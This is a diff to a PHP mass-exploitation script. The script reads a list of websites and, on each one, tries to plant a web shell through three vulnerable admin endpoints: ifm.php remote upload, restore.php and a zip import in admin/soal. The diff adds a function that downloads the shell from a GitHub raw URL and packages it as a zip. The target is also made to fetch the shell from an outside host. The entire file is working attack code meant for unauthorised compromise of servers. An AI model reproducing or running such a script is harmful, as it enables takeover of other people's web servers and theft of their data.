@@ -1,4 +1,18 @@
 <?php
+function spawnshell() {
+  $zip = new ZipArchive;
+  if (!file_exists("nax.php")) {
+    $open = fopen("nax.php", "w");
+    fwrite($open, file_get_contents("https://raw.githubusercontent.com/nastar-id/naxtarrr-shell/main/nax-shell.php"));
+    fclose($open);
+  }
+
+  if (!file_exists("nax.zip")) {
+    $zip->open("nax.zip", ZipArchive::CREATE);
+    $zip->addFile("nax.php");
+    $zip->close();
+  }
+}
 
 function req($url, $post = null) {
   $ch = curl_init();
@@ -14,6 +28,7 @@ function req($url, $post = null) {
   curl_close($ch);
   return $xx;
 }
+
 
 $green = "\033[0;32m";
 $red = "\033[0;31m";
@@ -39,26 +54,34 @@ if (!file_exists($web)) exit("{$red}[!] File {$argv[1]} not found\n");
 $get = file_get_contents($web);
 $exp = explode("\n", $get);
 
-if (!file_exists("nax.php")) {
-  $open = fopen("nax.php", "w");
-  fwrite($open, file_get_contents("https://raw.githubusercontent.com/nastar-id/naxtarrr-shell/main/nax-shell.php"));
-  fclose($open);
-}
+spawnshell();
 $shell = new CURLFile("nax.php");
+$zipshell = new CURLFile("nax.zip");
 
 foreach ($exp as $explode) {
-  $request = req($explode."/admin/ifm.php", "api=remoteUpload&dir=&filename=nax.php&method=curl&url=http://naxtarrr.fortysinc.com/nax.txt");
+  $request = req("{$explode}/admin/ifm.php", "api=remoteUpload&dir=&filename=nax.php&method=curl&url=http://naxtarrr.fortysinc.com/nax.txt");
   if (preg_match("/File successfully uploaded/", $request)) {
-    echo "{$green}[+] File successfully uploaded \n[+] ".$explode."/files/nax.php\n\n";
+    echo "{$green}[+] File successfully uploaded \n[+] {$explode}/files/nax.php\n\n";
+    continue;
   } else {
-    echo "{$red}[-] Upload successfully failed > \n[-] ".$explode."\n";
-    echo "{$blue}[*] Checking restore file\n";
-    $upload2 = req($explode."/admin/restore.php", ["datafile" => $shell]);
-    if (preg_match("/berhasil/", $upload2)) {
-      echo "{$green}[+] File successfully uploaded \n[+] ".$explode."/admin/nax.php\n\n";
-    } else {
-      echo "{$red}[-] Upload successfully failed > \n[-] ".$explode."\n\n";
-    }
+    echo "{$red}[-] Upload successfully failed > \n[-] {$explode}\n";
+  }
+
+  echo "{$blue}[*] Checking restore file\n";
+  $upload2 = req("{$explode}/admin/restore.php", ["datafile" => $shell]);
+  if (preg_match("/berhasil/", $upload2)) {
+    echo "{$green}[+] File successfully uploaded \n[+] {$explode}/admin/nax.php\n\n";
+    continue;
+  } else {
+    echo "{$red}[-] Upload successfully failed > \n[-] {$explode}\n";
+  }
+
+  echo "{$blue}[*] Trying upload zip shell\n";
+  $req = req("{$explode}/admin/soal/import_file.php", ["zip_file" => $zipshell]);
+  if (preg_match("/OK/", $req) || preg_match("/Success/", $req)) {
+    echo "{$green}[+] File successfully uploaded\n[+] {$explode}/files/nax.php\n\n";
+  } else {
+    echo "{$red}[-] Upload successfully failed > \n[-] {$explode}\n\n";
   }
 }
 ?>
